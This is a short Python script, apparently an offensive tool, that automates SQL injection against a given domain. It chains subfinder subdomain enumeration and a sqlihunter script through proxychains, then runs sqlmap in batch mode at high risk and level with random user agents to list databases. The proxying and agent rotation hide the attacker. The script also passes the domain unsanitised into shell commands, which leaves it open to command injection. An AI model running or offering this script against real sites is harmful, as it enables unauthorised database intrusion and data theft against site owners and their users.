#!/usr/bin/env python3

import argparse
import subprocess
import os

def run_command(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    return stdout.decode(), stderr.decode()

def main():
    parser = argparse.ArgumentParser(description="SQL Injection Hunter and Exploiter")
    parser.add_argument("-d", "--domain", required=True, help="Target domain or IP address")
    parser.add_argument("-o", "--output", required=True, help="Output file name")
    args = parser.parse_args()

    domain = args.domain
    output_file = args.output

    # Step 1: Run subfinder and sqlihunter
    print(f"[+] Running subfinder and sqlihunter on {domain}...")
    subfinder_command = f"proxychains subfinder -d {domain} -all -silent | proxychains python3 sqlihunter.py -o sqliurls.txt"
    run_command(subfinder_command)

    # Step 2: Run sqlmap
    print("[+] Running sqlmap on discovered URLs...")
    sqlmap_command = f"sqlmap -m sqliurls.txt --batch --dbs --risk 2 --level 5 --random-agent | tee -a {output_file}"
    stdout, stderr = run_command(sqlmap_command)

    # Print sqlmap output
    print(stdout)
    if stderr:
        print("Errors:")
        print(stderr)

    print(f"[+] Results saved to {output_file}")

    # Clean up temporary file
    os.remove("sqliurls.txt")

if __name__ == "__main__":
    main()
